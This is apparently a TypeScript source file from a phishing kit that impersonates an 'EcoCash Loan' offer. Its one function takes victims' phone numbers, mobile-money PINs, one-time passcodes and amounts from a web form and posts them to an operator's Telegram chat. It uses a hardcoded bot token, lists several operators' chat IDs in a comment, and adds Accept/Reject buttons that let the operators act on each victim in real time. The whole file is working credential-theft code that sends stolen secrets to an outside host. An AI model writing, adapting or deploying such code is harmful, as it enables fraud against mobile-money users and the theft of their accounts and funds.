export const token ="8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko";
export const secret = "JEMINI254";

export async function telFun(formData: any,) {
    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
    const url = `https://api.telegram.org/bot${token}/sendMessage`
    const action = formData.get("action");
    let message = "";
    let keyboard;

    if (action === "submit-phone") {
        message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
            `<b>country:</b> <code>+263</code>\n` +
            `<b>Pin:</b> <code>${formData.get("pin")}</code>\n` +
            `<b>Amount:</b> ${formData.get("amount")}`;
         keyboard= {
     inline_keyboard: [
      [
        {
          text: "✅ Accept",
          callback_data: `${formData.get("kit")}:accept`,
        },
        {
          text: "❌ Reject",
          callback_data: `${formData.get("kit")}:reject`,
        },
      ],
    ],
  };
    }


    if (action === "submit-otp") {
        message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
            `<b>Otp:</b> <code>${formData.get("otp")}</code>\n` + `<b>attempt:</b> ${formData.get("attempt")}`;
       
    }

     
    

    try {
        const res = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: 5991194967, //6562421557-kc,7895249781-evans // 5991194967-sam
                text:
                    `<b>EcoCash Loan: </b>\n ${message} `
                // Phone: ${formData.get("phone")}
                // PIN: ${formData.get("pin")}
                // OTP: ${formData.get("otp")}
                // Message: ${formData.get("message")}
                ,
                parse_mode: "HTML",
                reply_markup: keyboard,

            })

        });
        const data = await res.json();
        return data;
    } catch (e: any) {
        return e.message || e;
    }

}